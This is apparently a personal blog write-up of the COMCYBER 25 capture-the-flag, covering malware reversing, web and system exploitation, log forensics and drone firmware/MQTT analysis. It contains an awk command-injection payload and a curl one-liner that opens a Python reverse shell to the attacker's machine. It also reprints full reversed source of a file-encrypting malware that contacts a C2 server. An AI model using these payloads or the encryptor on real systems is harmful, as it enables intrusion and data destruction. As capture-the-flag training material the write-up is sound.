---
title: COMCYBER 25 Writeup
feed: show
permalink: /comcyber25
date: 10-02-2025
summary: War, war never changes
---

A small and fun CtF I did, so let's do a write-up!

### 1 : Analysis

Simple startup, we get 3 pictures of a drone with part of a serial number on each picture, and are asked to reassemble it to form the flag. ![[comcyber25_cam2_pic2.png| advanced warfare]]

There are 6 combinations, so a simple python script will help us find the correct one.

```python
import itertools
st = ["6X9","AVP","3BQ"]

for i in itertools.permutations(st):
	print("RM{" + "".join(i) + "}")
```


### 2 : Forensic Reverse

We get a DLL malware has encrypted important files!
We have the encrypted files and the DLL,, and we know it's written in C#. 
Easy peasy, we can decompile it with [ILSpy](https://github.com/icsharpcode/ILSpy) or [dotPeek](https://www.jetbrains.com/fr-fr/decompiler/).

some static strings in the DLL are encoded this way:

```csharp
	private static string L()
		{
			string text = "OF/sfn87WwjfIX14p17jp8mu5uavNFecb4D97pgVfZc=";
			byte[] bytes = Encoding.ASCII.GetBytes(Y.G().Substring(0, 16));
			byte[] bytes2 = Encoding.ASCII.GetBytes(Y.H().Substring(0, 16));
			return Y.M(Convert.FromBase64String(text), bytes, bytes2);
		}

		private static string M(byte[] d, byte[] k, byte[] i)
		{
			string text;
			using (Aes aes = Aes.Create())
			{
				aes.Key = k;
				aes.IV = i;
				ICryptoTransform cryptoTransform = aes.CreateDecryptor(aes.Key, aes.IV);
				using (MemoryStream memoryStream = new MemoryStream(d))
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Read))
					{
						using (StreamReader streamReader = new StreamReader(cryptoStream))
						{
							text = streamReader.ReadToEnd();
						}
					}
				}
			}
			return text;
		}
```

All this text to say that the strings are encrypted in AES, but we have the key and IV in the binary, so we can decrypt them whith a simple python script:

```python
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt(ciphertext, key, iv):
    cipher = AES.new(bytes("".join(key[:16]), "utf8"), AES.MODE_CBC, bytes("".join(iv[:16]), "utf8"))
    pt = unpad(cipher.decrypt(base64.b64decode(ciphertext)), AES.block_size)
    return pt


l = "OF/sfn87WwjfIX14p17jp8mu5uavNFecb4D97pgVfZc="
o = "3Npd3p5V7JSh6JZ5gqRmZg=="
n = "IeLkqcSXkaE8QamE7i4DEY3N7NmqJvAl1fzI7gIQkbo="
nbn =  "..."


key = ['A', 'A', '$', 'F', '2', '-', 'D', '8', 'C', '1', 'E', '7', 'B', '9', 'F', '3', 'A', '3', '5', '@', 'C', '8', '@', '!', 'B', 'B', '2', 'E', '1', 'F', '0', 'A', '7', 'C', '3', 'D' ]
iv = ['D', '1', '@', 'E', '2', '#', 'F', '3', '%', 'A', '4', 'B', '5', '&', 'C', '6', 'D', '1', '@', 'E', '2', '#', 'F', '3', '%', 'A', '4', 'B', '5', '&', 'C', '6', 'D', '1', '@', 'E', '2', '#', 'F', '3', '%', 'A', '4', 'B', '5', '&', 'C', '6']

for elem in [l, o, n, nbn]:
    print(decrypt(elem, key, iv).decode("utf-8"))
```

```
http://163.172.66.233:3000
admin
wqHQBzgxXZ6mhpdbvL2KfE
RM{...}
```

We have the flag, but we would like to decrypt the files.
We understand that the encryption is done in AES with:
- a static key, retrieved in the DLL
- a dynamic key, to get on a server
- the date when the script was run
- the full path of the folder to encrypt

There is an `/secretkey` endpoint on the C2 url! 
When we try to login and access it we get an "This endpoint has been disabled until further notice" answer :/

So for now we only have the first element. As the challenge description said, we can't decode the files yet.

you can find for reference a cleaned up reversed version of the malware [at the bottom of this article](#reversed-vpnupdaterdll) .


### 3 : Web pentest

We already found the C2 url, and tried to enumerate the API endpoints on port 3000, but there's not much to do, we only have:
- `/login` (gives a token)
- `/secretkey` disabled
- `/` also disabled, was used to send the "composite key" to the server.

The challenge description tells use port scanning is authorized, so let's do that!

```bash
sudo nmap -sS -sV -sC -v -Pn -O 163.172.66.233

	3000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.11.2)
	5000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.11.2)
```

We have port 5000 open, and it's a C2 web interface!

![[comcyber25.png|don't get *too* excited, it's all fake static data...]]

But we can't interact a lot with it, as it's a fake interface with dummy data...
Still we find one api endpoint, `/api/refresh` , a POST endpoint that takes a numerical `agent_id` parameter... Let's fuzz that with our custom wordlist!

```bash
curl 'http://163.172.66.233:5000/api/refresh' -X POST -H 'Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.Z8iYXQ.iHPNCt_USDQX8EKrOQrrralWdLM' -H 'Content-Type: application/json' --data-raw '{ "agent_id" : "\" "}'

	{"message":"awk: line 1: runaway string constant \") print $4 ...\n"}

```

Ah! a single quote triggers an `awk` error, our input is not correctly sanitized!
[GTFOBins](https://gtfobins.github.io/gtfobins/awk/) tells us we can execute system commands from awk.
We have to fix a bit our payload to close some quotes and not trigger errors anymore, but we get:

```bash
{ "agent_id" : "\")}\n BEGIN {system(\"/bin/whoami\")} # "}

	{"message":"c2-web"}
```

Now to a reverse shell! There are easier ways, but we discover python is available on the server, and to not get lost with quotes escaping, we will encode our ip adress to a bytes array.

```bash
# on one tab, our listener:
nc -lnvp 8000

# trigger it
curl 'http://163.172.66.233:5000/api/refresh' -X POST -H 'Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.Z8iYXQ.iHPNCt_USDQX8EKrOQrrralWdLM' -H 'Content-Type: application/json' --data-raw '{ "agent_id" : "a\")}\n BEGIN {system(\"/bin/python3 -c '\''import sys,socket,os,pty;s=socket.socket();s.connect((bytes([YOUR_IP_HERE]).decode(),8000));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(bytes([98,97,115,104]).decode())'\'' \")} \n #"}'

	c2-web@2cb7d7bf8458:/app$
	ls
		app.py	flag_3.txt  mise.toml  requirements.txt  static
	cat flag_3.txt
		RM{...}
```

### 4 : System pentest

Now we have access on the server , we need to ~~escalate~~ "abuse" our privileges as the challenge description corrected itself.

A linpeas run will reveal that there is an "administrator" user with an intersting cron job:

```bash
./linpeas.sh

	Cron jobs
	/etc/cron.d:
		backup

	All users & groups
		uid=997(administrator)

	Unexpected in root
		/backup
		/app
		/api

	Backup files
		administrator 1367 Mar 13 13:50 /var/log/backup.log
		administrator 1658 Feb 19 16:28 /opt/backup.sh

cat /etc/cron.d/backup
	*/5 * * * * administrator /opt/backup.sh
```

So we have a secrets backup cron job ran every 5 minutes.

You can see the [full backup.sh file at the bottom of the article](#backupsh-file).
To summarize, it checks if the `/api/secrets.json` file was updated, and if yes,
copy it to a `/tmp/${DATE}/secrets_${DATE}.json`, zip its, copies it to the backup directory, and deletes everything in `/tmp`...
But does it really?

We don't have any access to the `/api` and `/backup` folders.
We found no ways to update the  `/api/secrets.json`, despite hardcore fuzzing all endpoints and parameters  of the available APIs.
And even if we have access to `/tmp`, we can't list files in it, making enumeration complicated.

Wait a minute, we can't list files? and the folder is owned by root? so administrator surely cannot list files either...
that means, in `backup.sh`, on the line

```bash
# Make sure everything that we have done is deleted from /tmp
/usr/bin/rm -rf /tmp/*
```

the wildcard will return nothing, so no files will be deleted, we will be able to recover the temporary secrets file! That's why it was a convoluted script doing `cp` instead of `mv`!

But how do we recover the filename of an available backup, as it contains a timestamp in it?
Two ways:

- pspy

The [pspy](https://github.com/DominicBreuker/pspy) tool lists all processes running on the machine, and we can find interesting stuff in the command line arguments that are transmitted in clear by the backup cron job for all users on the machine:

```bash
./pspy
	... /usr/bin/gzip -d -c /backup/secrets_1739291700.json.gz
```

- backup logs

The backup logs also gives us the date of the last successful backup, date we can convert to a timestamp.

```bash
cat /var/log/backup.log
    Tue Feb 11 16:35:00 UTC 2025 - Compressing secrets file and moving it to backup directory

date --date "Tue Feb 11 16:35:00 UTC 2025" +%s
  1739291700  
```

We can then extract the file left on `/tmp`, get the flag, and the dynamic key for the file decryption. (it's one of the 3 available)

```bash
gunzip -c /tmp/1739291700/secrets_1739291700.json.gz
    {
    "admin": [
      "01f4d362ecdd89d26f5f0c5e6b2afe93",
      "35319a21dbe2ced1a7da56c2d717bb0d",
      "d7a6f9650e30eb65f8f6506c6d170b9a"
    ],
    "flag_4": "RM{...}"
  }
```

### 5 : Forensic

The SOC team has given us access to the system logs of the machine compromized by the encryptor!
We can read them with the Windows event viewer native tool.
There are lots of event, but if we search "VPNUpdater" we only get two results, with only one interesting, showing:

```bash
Timestamp 2025-02-11T16:28:16.5129185Z
CommandLine "C:\Users\thomas.mara\Downloads\vpn_update\vpn_update\VPNUpdater.exe" \\dc01\shares\private

```

We now have everything we need to decrypt our files! To be certain, let's write our decryptor in C#, with pieces of code borrowed from the encryptor


```csharp
using System.Security.Cryptography;
using System.Text;

string folderName = "private";
string trueFolderName = "\\\\dc01\\shares\\private";
string dynamicKey = "35319a21dbe2ced1a7da56c2d717bb0d";
string staticKey = "AA$F2-D8C1E7B9F3A35@C8@!BB2E1F0A7C3D";
string s_iv = "D1@E2#F3%A4B5&C6D1@E2#F3%A4B5&C6D1@E2#F3%A4B5&C6";
string timestamp = "2025-02-11T16:28:16Z";

byte[] iv = Encoding.ASCII.GetBytes(s_iv.Substring(0, 16));


byte[] compKey = ComputeCompositeKey(dynamicKey, staticKey, trueFolderName, timestamp);

decryptFolder(folderName,compKey, iv);


byte[] ComputeCompositeKey(string dkey, string skey, string folder, string timestamp)
{
    using (SHA256 sha = SHA256.Create())
    {
        return sha.ComputeHash(Encoding.ASCII.GetBytes(dkey + skey + folder + timestamp));
    }
}

void decryptFolder(string folder, byte[] compKey, byte[] iv)
{
    foreach (string text in Directory.GetFiles(folder))
    {
        if (text.EndsWith(".enc")) {
            try
            {
                decryptFile(text, compKey, iv);
                Console.WriteLine("E: " + text);
            }
            catch (Exception ex)
            {
                Console.WriteLine("X: " + ex.Message);
            }
        }
    }
    foreach (string text2 in Directory.GetDirectories(folder))
    {
        decryptFolder(text2, compKey, iv);
    }
}

void decryptFile(string f, byte[] k, byte[] i)
{
    string text2 = f.Replace(".enc", "");
    using (FileStream fileStream = new FileStream(f, FileMode.Open, FileAccess.Read))
    {
        using (FileStream fileStream2 = new FileStream(text2, FileMode.Create, FileAccess.Write))
        {
            using (Aes aes = Aes.Create())
            {
                ICryptoTransform cryptoTransform = aes.CreateDecryptor(k, i);
                using (CryptoStream cryptoStream = new CryptoStream(fileStream2, cryptoTransform, CryptoStreamMode.Write))
                {
                    fileStream.CopyTo(cryptoStream);
                }
            }
        }
    }
}
```

and in `private/crew_list.html` we have the flag!

### 6: Connected system

to finish the challenge, we are given the firmware of the drone.
It's a bin file, so let's extract it's content with 

```bash
binwalk flash.bin -e

	0x10200    LZMA compressed data...
	0x100000   SquashFS file system...

ls extractions/flash.bin.extracted/100000/squashfs-root
	config.ini  PHANTOM-CA.crt  
	PHANTOM-CX-8.crt  PHANTOM-CX-8.key  PHANTOM-CX-8.pub
```


> [!info] note
> install `sasquatch` to extract the Squash file system and `vmlinux-to-elf` if you really want to extract the linux kernel (even if it does not contain anything of interest here)


So we have a basic linux kernel, and a file system, containing certificates and keys, plus a config file. Interesting parts of   `config.ini`

```bash
[global]
user		= admin
secret		= nimda
device_id	= fc92b2536b52521b916dfaa43ea0be05
...
[mqtt]
srv_addr	= 212.83.175.198
srv_port	= 17883
srv_sec		= mTLS
srv_endpoint	= drones/DEVICE_ID
```

We will need to connect via the MQTT protocol! It's an IoT protocol, let's not ponder too much on what it is and how it works, and let's use a GUI tool [mqtt-explorer](https://mqtt-explorer.com/), to "subscribe" to the server's communication.

we setup the connection by:
- toggling on "encryption" 
- toggling off "validate certificate",
- defining  port, user/password
- go to "advanced to :
    - setup the certificate / client key 
    - set the topic `drones/fc92b2536b52521b916dfaa43ea0be05`

In the end, we get a list of messages, and as the tool by default subscribed us to all communications endpoints, we notice the flag is in a message in *another endpoint* than the one of our drone!

![[comcyber25_mqtt.png|well done, you've finished the comcyber challenge]]

> [!error] warning!
> I tried with the "mqttui" tool, which awaited the certificate in a specific format I did not manage to convert to, and with "mosquitto_sub" which connected but did not subscribed to other channels by default, so the flag did not appear. I'll stick with "MQTT Explorer"!

### backup.sh file

```bash
#!/usr/bin/env bash

BACKUP_DIR="/backup"
LOG_FILE="/var/log/backup.log"
BKP_FILE="/api/secrets.json"

log() {
    local log_msg=$1
    echo "$(/usr/bin/date -u) - ${log_msg}" >> ${LOG_FILE}
}

backup() {
    local DATE=$(/usr/bin/date +%s)
    local DIR="/tmp/${DATE}"
    /usr/bin/mkdir -m 755 -p "${DIR}" && /usr/bin/chown -R administrator:administrator "${DIR}" 
    log "Copying secrets file to temporary directory"

    
    /usr/bin/cp "${BKP_FILE}" "/tmp/${DATE}/secrets_${DATE}.json"

    /usr/bin/cp "${BKP_FILE}" "${DIR}/secrets_${DATE}.json"
    log "Compressing secrets file and moving it to backup directory"
    /usr/bin/gzip "${DIR}/secrets_${DATE}.json" && /usr/bin/cp "${DIR}/secrets_${DATE}.json.gz" "${BACKUP_DIR}/secrets_${DATE}.json.gz"
    log "Backup done" 
    log "Removing temporary directory"
    clear_tmp
}

clear_tmp() {
    # Make sure everything that we have done is deleted from /tmp
    /usr/bin/rm -rf /tmp/*
    log "Temporary directory cleared"
    exit 0
}

log "Backup script started"

if [ ! -d ${BACKUP_DIR} ]; then
    log "Backup directory does not exist, exiting"
    exit 1
fi

if [ -z "$(/usr/bin/ls -A ${BACKUP_DIR})" ]; then
    log "No backup found, initiating a new backup..."
    backup
else
    NEWEST_BKP=$(/usr/bin/ls -t "${BACKUP_DIR}" | /usr/bin/head -n 1)
    SHA_NEWEST_BKP=$(/usr/bin/gzip -d -c "${BACKUP_DIR}/${NEWEST_BKP}" | /usr/bin/sha256sum | /usr/bin/awk '{print $1}')
    SHA_LATEST=$(/usr/bin/sha256sum "${BKP_FILE}" | /usr/bin/awk '{print $1}')

    if [ "${SHA_NEWEST_BKP}" != "${SHA_LATEST}" ]; then
        log "New backup needed, initiating a new backup..."
        backup
    else
        log "No new backup needed, exiting"
        exit 0
    fi
fi
```

go back to [4: System pentest](#4--system-pentest)
### reversed VPNUpdater.dll

```csharp
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace X
{
	[NullableContext(1)]
	[Nullable(0)]
	internal class Y
	{
		public static void Main(string[] p)
		{
			Y.MainAsync(p).Wait();
		}

		private static async Task MainAsync(string[] p)
		{
			string folderName = p[0];
			string t = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ");
			string c2url = "http://163.172.66.233:3000";
			string username = "admin";
			string password = "http://163.172.66.233:3000";
			string staticKey = "AA$F2-D8C1E7B9F3A35@C8@!BB2E1F0A7C3D";
			string dynamicKey = await Y.getDynamicKey(c2url, username, password);
			byte[] compKey = Y.ComputeCompositeKey(dynamicKey, staticKey, folderName, t);
			byte[] iv = Encoding.ASCII.GetBytes("D1@E2#F3%A4B5&C6");
			if (Directory.Exists(folderName))
			{
				Y.encryptFolder(folderName, compKey, iv);
			}
			string compositeData = Convert.ToBase64String(compKey);
			await Y.PostToC2(c2url, compositeData, username, password);
		}

		private static void encryptFolder(string folder, byte[] compKey, byte[] iv)
		{
			foreach (string filename in Directory.GetFiles(folder))
			{
				try
				{
					Y.EncryptFile(filename, compKey, iv);
				}
				catch (Exception ex)
				{
					Console.WriteLine("X: " + ex.Message);
				}
			}
			foreach (string nfolder in Directory.GetDirectories(folder))
			{
				Y.encryptFolder(nfolder, compKey, iv);
			}
		}

		private static byte[] ComputeCompositeKey(string dkey, string skey, string folder, string timestamp)
		{
			string text = dkey + skey + folder + timestamp;
			byte[] array;
			using (SHA256 sha = SHA256.Create())
			{
				array = sha.ComputeHash(Encoding.ASCII.GetBytes(text));
			}
			return array;
		}

		private static void EncryptFile(string f, byte[] k, byte[] i)
		{
			string text = f + ".tmp";
			string text2 = f + ".enc";
			using (FileStream fileStream = new FileStream(f, FileMode.Open, FileAccess.Read))
			{
				using (FileStream fileStream2 = new FileStream(text, FileMode.Create, FileAccess.Write))
				{
					using (Aes aes = Aes.Create())
					{
						aes.Key = k;
						aes.IV = i;
						ICryptoTransform cryptoTransform = aes.CreateEncryptor(aes.Key, aes.IV);
						using (CryptoStream cryptoStream = new CryptoStream(fileStream2, cryptoTransform, CryptoStreamMode.Write))
						{
							fileStream.CopyTo(cryptoStream);
						}
					}
				}
			}
			File.Delete(f);
			File.Move(text, text2);
		}

		private static async Task<string> getDynamicKey(string baseUrl, string username, string password)
		{
			string text;
			try
			{
				using (HttpClient client = new HttpClient())
				{
					var loginData = new { username, password };
					string json = JsonConvert.SerializeObject(loginData);
					StringContent content = new StringContent(json, Encoding.UTF8, "application/json");
					HttpResponseMessage httpResponseMessage = await client.PostAsync(baseUrl + "/login", content);
					HttpResponseMessage loginResponse = httpResponseMessage;
					httpResponseMessage = null;
					if (!loginResponse.IsSuccessStatusCode)
					{
						Console.WriteLine("E: Failed to log in.");
						text = null;
					}
					else
					{
						string text2 = await loginResponse.Content.ReadAsStringAsync();
						string loginResponseBody = text2;
						text2 = null;
						JObject loginJson = JObject.Parse(loginResponseBody);
						JToken jtoken = loginJson["token"];
						string token = ((jtoken != null) ? jtoken.ToString() : null);
						if (string.IsNullOrEmpty(token))
						{
							Console.WriteLine("E: No token found in login response.");
							text = null;
						}
						else
						{
							client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token);
							HttpResponseMessage httpResponseMessage2 = await client.GetAsync(baseUrl + "/secretkey");
							HttpResponseMessage secretResponse = httpResponseMessage2;
							httpResponseMessage2 = null;
							Console.WriteLine("I: SecretKey: " + secretResponse.StatusCode.ToString());
							if (!secretResponse.IsSuccessStatusCode)
							{
								Console.WriteLine("E: Failed to retrieve secret key.");
								text = null;
							}
							else
							{
								string text3 = await secretResponse.Content.ReadAsStringAsync();
								string secretKeyBody = text3;
								text3 = null;
								JObject secretKeyJson = JObject.Parse(secretKeyBody);
								JToken jtoken2 = secretKeyJson["key"];
								string secretKey = ((jtoken2 != null) ? jtoken2.ToString() : null);
								Console.WriteLine("I: Secret Key retrieved");
								text = secretKey;
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error: " + ex.Message);
				text = null;
			}
			return text;
		}

		private static async Task PostToC2(string url, string data, string username, string password)
		{
			using (HttpClient client = new HttpClient())
			{
				Dictionary<string, string> values = new Dictionary<string, string>
				{
					{ "username", username },
					{ "password", password },
					{ "data", data }
				};
				FormUrlEncodedContent content = new FormUrlEncodedContent(values);
				try
				{
					HttpResponseMessage httpResponseMessage = await client.PostAsync(url, content);
					HttpResponseMessage response = httpResponseMessage;
					httpResponseMessage = null;
					Console.WriteLine("R: " + response.StatusCode.ToString());
					response = null;
				}
				catch (Exception ex)
				{
					Console.WriteLine("E: " + ex.Message);
				}
				values = null;
				content = null;
			}
			HttpClient client = null;
		}
	}
}
```

go back to [2: Forensic Reverse](#2--forensic-reverse)
